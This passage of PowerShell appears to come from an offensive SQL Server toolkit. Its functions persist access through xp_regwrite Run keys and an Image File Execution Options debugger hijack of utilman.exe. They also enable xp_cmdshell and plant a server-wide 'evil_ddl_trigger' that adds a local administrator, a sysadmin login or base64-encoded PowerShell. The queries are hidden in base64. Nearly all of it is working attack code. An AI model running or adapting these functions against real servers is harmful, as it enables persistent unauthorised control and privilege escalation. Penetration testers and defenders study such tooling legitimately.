                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $Sid,
                [string]$_.PrincipalType,
                $_.CreateDate,
                [string]$_.DefaultDatabaseName,
            [string]$_.PasswordHash)
        }
        Write-Verbose -Message "$Instance : Attempt complete."
        if($Migrate){          
            Invoke-TokenManipulation -RevToSelf | Out-Null
        }       
    }
    End
    {
        $PasswordHashCount = $TblPasswordHashes.Rows.Count
        write-verbose "$PasswordHashCount password hashes recovered."
        if($PasswordHashCount -gt 0){
            $TblPasswordHashes            
        }
    }
}
Function   Get-SQLPersistRegRun
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$Name = "Hacker",
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$Command = 'PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }
        if($IsSysadmin -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }else{
            Write-Verbose "$Instance : Attempting to write value: $name"
            Write-Verbose "$Instance : Attempting to write command: $command"
        }
        $Query = "
       ---------------------------------------------
        -- Use xp_regwrite to configure 
        -- a file to execute sa command when users l
        -- log into the system
        ----------------------------------------------
        EXEC master..xp_regwrite
        @rootkey     = 'HKEY_LOCAL_MACHINE',
        @key         = 'Software\Microsoft\Windows\CurrentVersion\Run',
        @value_name  = '$Name',
        @type        = 'REG_SZ',
        @value       = '$Command'"
        $Results = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CheckQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------
        -- Get AutoLogin Default Domain
        DECLARE @CheckValue  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'Software\Microsoft\Windows\CurrentVersion\Run',
        @value_name		= N'$Name',
        @value			= @CheckValue output
        
        -- Display Results
        SELECT CheckValue = @CheckValue"
        $CheckResults = Get-SQLQuery -Instance $Instance -Query $CheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
        $CheckCommand = $CheckResults.CheckValue   
        if($CheckCommand.length -ge 2){
            Write-Verbose "$Instance : Registry entry written."                   
        }else{
            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
        } 
    }
    End
    {
        Write-Verbose "$Instance : Done."
    }
}
Function   Get-SQLPersistRegDebugger
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$FileName= "utilman.exe",
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$Command = 'c:\windows\system32\cmd.exe',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }
        if($IsSysadmin -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }else{
            Write-Verbose "$Instance : Attempting to write debugger: $FileName"
            Write-Verbose "$Instance : Attempting to write command: $Command"
        }
        $Query = "
       --- This will create a registry key through SQL Server (as sysadmin)
        -- to run a defined debugger (any command) instead of intended command
        -- in the example utilman.exe can be replace with cmd.exe and executed on demand via rdp
        --- note: this could easily be a empire/other payload
        EXEC master..xp_regwrite
        @rootkey     = 'HKEY_LOCAL_MACHINE',
        @key         = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
        @value_name  = 'Debugger',
        @type        = 'REG_SZ',
        @value       = '$Command'"
        $Results = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CheckQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------
        -- Get AutoLogin Default Domain
        DECLARE @CheckValue  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
        @value_name		= N'Debugger',
        @value			= @CheckValue output
        
        -- Display Results
        SELECT CheckValue = @CheckValue"
        $CheckResults = Get-SQLQuery -Instance $Instance -Query $CheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
        $CheckCommand = $CheckResults.CheckValue   
        if($CheckCommand.length -ge 2){
            Write-Verbose "$Instance : Registry entry written."                   
        }else{
            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
        } 
    }
    End
    {
        Write-Verbose "$Instance : Done."
    }
}
Function Get-SQLPersistTriggerDDL
{
  [CmdletBinding()]
  Param(
    [Parameter(Mandatory = $false,
    HelpMessage = 'Username to authenticate with.')]
    [string]$Username,
    [Parameter(Mandatory = $false,
    HelpMessage = 'Password to authenticate with.')]
    [string]$Password,
    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new SQL Server sysadmin login.')]
    [string]$NewSqlUser,
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new SQL Server sysadmin login.')]
    [string]$NewSqlPass,
    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new Windows local administrator account.')]
    [string]$NewOsUser,
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new Windows local administrator account.')]
    [string]$NewOsPass,
    [Parameter(Mandatory=$false,
    HelpMessage='Create trigger that will run the provide PowerShell command.')]
    [string]$PsCommand,
    [Parameter(Mandatory = $false,
    ValueFromPipelineByPropertyName = $true,
    HelpMessage = 'SQL Server instance to connection to.')]
    [string]$Instance,
    [Parameter(Mandatory=$false,
    HelpMessage='This will remove the trigger named evil_DDL_trigger create by this script.')]
    [Switch]$Remove
  )
    $conn = New-Object System.Data.SqlClient.SqlConnection
    if($Username){
        Write-Verbose "$Instance : Attempting to authenticate to $Instance with SQL login $Username..."
        $conn.ConnectionString = "Server=$Instance;Database=master;User ID=$Username;Password=$Password;"
        [string]$ConnectUser = $Username
    }else{
        Write-Verbose "$Instance : Attempting to authenticate to $Instance as the current Windows user..."
        $conn.ConnectionString = "Server=$Instance;Database=master;Integrated Security=SSPI;"   
        $UserDomain = [Environment]::UserDomainName
        $DUsername = [Environment]::UserName
        $ConnectUser = "$UserDomain\$DUsername"                    
     }
    try{
        $conn.Open()
        Write-Verbose "$Instance : Connected." 
        $conn.Close()
    }catch{
        $ErrorMessage = $_.Exception.Message
        Write-Verbose "$Instance : Connection failed" 
        Write-Verbose "$Instance : Error: $ErrorMessage"  
        Break
    }
    $conn.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIABpAHMAXwBzAHIAdgByAG8AbABlAG0AZQBtAGIAZQByACgAJwBzAHkAcwBhAGQAbQBpAG4AJwApACAAYQBzACAAcwB5AHMAcwB0AGEAdAB1AHMA')))
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 
    $TableIsSysAdmin = New-Object System.Data.DataTable
    $TableIsSysAdmin.Load($results)  
    $TableIsSysAdmin | select -First 1 sysstatus | foreach {
        $Checksysadmin = $_.sysstatus
        if ($Checksysadmin -ne 0){
            Write-Verbose "$Instance : Confirmed Sysadmin access."                             
        }else{
            Write-Verbose "$Instance : The current user does not have sysadmin privileges." 
            Write-Verbose "$Instance : Sysadmin privileges are required." 
            Break
        }
    }
    $conn.Close()
    Write-Verbose "$Instance : Enabling 'Show Advanced Options', if required..."
    $conn.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAAKABzAGUAbABlAGMAdAAgAHYAYQBsAHUAZQBfAGkAbgBfAHUAcwBlACAAZgByAG8AbQAgAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAdwBoAGUAcgBlACAAbgBhAG0AZQAgAD0AIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcAKQAgAD0AIAAwAA0ACgAgACAAIAAgAEUAWABFAEMAIAAoACcAcwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnACcAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAJwAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQAnACkA')))
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 
    $conn.Close()    
    Write-Verbose "$Instance : Enabling 'xp_cmdshell', if required..."  
    $conn.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAAKABzAGUAbABlAGMAdAAgAHYAYQBsAHUAZQBfAGkAbgBfAHUAcwBlACAAZgByAG8AbQAgAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAdwBoAGUAcgBlACAAbgBhAG0AZQAgAD0AIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACkAIAA9ACAAMAANAAoAIAAgACAAIABFAFgARQBDACAAKAAnAHMAcABfAGMAbwBuAGYAaQBnAHUAcgBlACAAJwAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACcAKQA=')))
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 
    $conn.Close()  
    Write-Verbose "$Instance : Checking if service account is a local administrator..."  
    $conn.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAFMAZQB0AHUAcAAgAHIAZQBnACAAcABhAHQAaAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgAEAAQABTAEUAUgBWAEkAQwBFAE4AQQBNAEUAIAA9ACAAJwBNAFMAUwBRAEwAUwBFAFIAVgBFAFIAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgBFAEcASQBOAAkACQAJAAkACQAJAAkACQAJAAkACQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIASQBuAHMAdABhAG4AYwBlACAAPQAgACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAFMAUwBRAEwAUwBFAFIAVgBFAFIAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBOAEQACQAJAAkACQAJAAkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEIARQBHAEkATgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIASQBuAHMAdABhAG4AYwBlACAAPQAgACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAFMAUwBRAEwAJAAnACsAYwBhAHMAdAAoAEAAQABTAEUAUgBWAEkAQwBFAE4AQQBNAEUAIABhAHMAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQApAAkACQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBOAEQADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAHIAYQBiACAAcwBlAHIAdgBpAGMAZQAgAGEAYwBjAG8AdQBuAHQAIABmAHIAbwBtACAAcwBlAHIAdgBpAGMAZQAnAHMAIAByAGUAZwAgAHAAYQB0AGgADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAFMAZQByAHYAaQBjAGUAYQBjAGMAbwB1AG4AdABOAGEAbQBlACAAdgBhAHIAYwBoAGEAcgAoADIANQAwACkAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUALAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBPAGIAagBlAGMAdABOAGEAbQBlACcALABAAFMAZQByAHYAaQBjAGUAQQBjAGMAbwB1AG4AdABOAGEAbQBlACAATwBVAFQAUABVAFQALAAgAE4AJwBuAG8AXwBvAHUAdABwAHUAdAAnACAADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5ACAAIAAgACAAIAAgAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAGsAZQB5ACAAIAAgACAAIAAgACAAIAAgACAAPQAgAE4AJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABQAHIAbwBkAHUAYwB0AE8AcAB0AGkAbwBuAHMAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUAIAAgACAAPQAgAE4AJwBQAHIAbwBkAHUAYwB0AFQAeQBwAGUAJwAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlACAAIAAgACAAIAAgACAAIAA9ACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIABvAHUAdABwAHUAdAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAcgBhAGIAIABtAG8AcgBlACAAaQBuAGYAbwAgAGEAYgBvAHUAdAAgAHQAaABlACAAcwBlAHIAdgBlAHIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAQABTAGUAcgB2AGkAYwBlAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAgAGEAcwAgAFMAdgBjAEEAYwBjAHQA')))
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 
    $TableServiceAccount = New-Object System.Data.DataTable
    $TableServiceAccount.Load($results)  
    $SqlServeServiceAccountDirty = $TableServiceAccount | select SvcAcct -ExpandProperty SvcAcct 
    $SqlServeServiceAccount = $SqlServeServiceAccountDirty -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAuAFwAXAA='))),''
    $conn.Close() 
    $conn.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgB4AHAAXwBjAG0AZABzAGgAZQBsAGwAIAAnAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAnADsA')))
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 
    $TableServiceAccountPriv = New-Object System.Data.DataTable
    $TableServiceAccountPriv.Load($results)  
    $conn.Close()  
    if($SqlServeServiceAccount -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAFMAeQBzAHQAZQBtAA=='))) -or $TableServiceAccountPriv -contains "$SqlServeServiceAccount"){
        Write-Verbose "$Instance : The service account $SqlServeServiceAccount has local administrator privileges."  
        $SvcAdmin = 1
    }else{
        Write-Verbose "$Instance : The service account $SqlServeServiceAccount does NOT have local administrator privileges." 
        $SvcAdmin = 0 
    }
    $Query_PsCommand = ""
     if($PsCommand){
        Write-Verbose "$Instance : Creating encoding PowerShell payload..." 
        if($SvcAdmin -eq 0){
            Write-Verbose "$Instance : Note: PowerShell won't be able to take administrative actions due to the service account configuration." 
        }
        $CmdBytes = [Text.Encoding]::Unicode.GetBytes($PsCommand)
        $EncodedCommand = [Convert]::ToBase64String($CmdBytes)
        If ($EncodedCommand.Length -gt 8100)
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAGUAbgBjAG8AZABlAGQAIABwAGEAeQBsAG8AYQBkACAAaQBzACAAdABvAG8AIABsAG8AbgBnACAAcwBvACAAdABoAGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAYwBvAG0AbQBhAG4AZAAgAHcAaQBsAGwAIABuAG8AdAAgAGIAZQAgAGEAZABkAGUAZAAuAA=='))) 
        }else{
            $Query_PsCommand = "EXEC master..xp_cmdshell ''PowerShell -enc $EncodedCommand'';" 
            Write-Verbose "$Instance : Payload generated." 
        }
    }else{
        Write-Verbose "$Instance : Note: No PowerShell will be executed, because the parameters weren't provided." 
    }
    $Query_OsAddUser = ""
    if($NewOsUser){
        Write-Verbose "$Instance : Creating payload to add OS user..." 
        if($SvcAdmin -eq 0){
            Write-Verbose "$Instance : The service account does not have local administrator privileges so no OS admin can be created.  Aborted."
            Break
        }else{
            $Query_OsAddUser = "EXEC master..xp_cmdshell ''net user $NewOsUser $NewOsPass /add & net localgroup administrators /add $NewOsUser'';"
            Write-Verbose "$Instance : Payload generated." 
        }
    }else{
        Write-Verbose "$Instance : Note: No OS admin will be created, because the parameters weren't provided." 
    }
    $Query_SysAdmin = ""
    if($NewSqlUser){
        Write-Verbose "$Instance : Generating payload to add sysadmin..." 
        $Query_SysAdmin = "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = ''$NewSqlUser'')
        exec(''CREATE LOGIN $NewSqlUser WITH PASSWORD = ''''$NewSqlPass'''';EXEC sp_addsrvrolemember ''''$NewSqlUser'''', ''''sysadmin'''';'')"
        Write-Verbose "$Instance : Payload generated." 
    }else{
        Write-Verbose "$Instance : Note: No sysadmin will be created, because the parameters weren't provided." 
    }
    if(($NewSqlUser) -or ($NewOsUser) -or ($PsCommand)){
        Write-Verbose "$Instance : Creating trigger..." 
        $conn.Open()
        $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger') 
        DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER
        exec('CREATE Trigger [evil_ddl_trigger] 
        on ALL Server
        For DDL_SERVER_LEVEL_EVENTS
        AS
        $Query_OsAddUser $Query_SysAdmin $Query_PsCommand')"
        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 
        $conn.Close()
         Write-Verbose "$Instance : The evil_ddl_trigger trigger has been added. It will run with any DDL event." 
    }else{
        Write-Verbose "$Instance : No options were provided." 
    }
    if($Remove){
        Write-Verbose "$Instance : Removing trigger named evil_DDL_trigger..." 
        $conn.Open()
        $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAARQBYAEkAUwBUAFMAIAAoAFMARQBMAEUAQwBUACAAKgAgAEYAUgBPAE0AIABzAHkAcwAuAHMAZQByAHYAZQByAF8AdAByAGkAZwBnAGUAcgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAD0AIAAnAGUAdgBpAGwAXwBkAGQAbABfAHQAcgBpAGcAZwBlAHIAJwApACAADQAKACAAIAAgACAAIAAgACAAIABEAFIATwBQACAAVABSAEkARwBHAEUAUgAgAFsAZQB2AGkAbABfAGQAZABsAF8AdAByAGkAZwBnAGUAcgBdACAATwBOACAAQQBMAEwAIABTAEUAUgBWAEUAUgA=')))
        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 
        $conn.Close()
        Write-Verbose "$Instance : The evil_ddl_trigger trigger has been been removed." 
    }
    Write-Verbose "$Instance : All done."
}
Function Invoke-SQLAuditTemplate
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: [VULNERABILITY NAME]"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
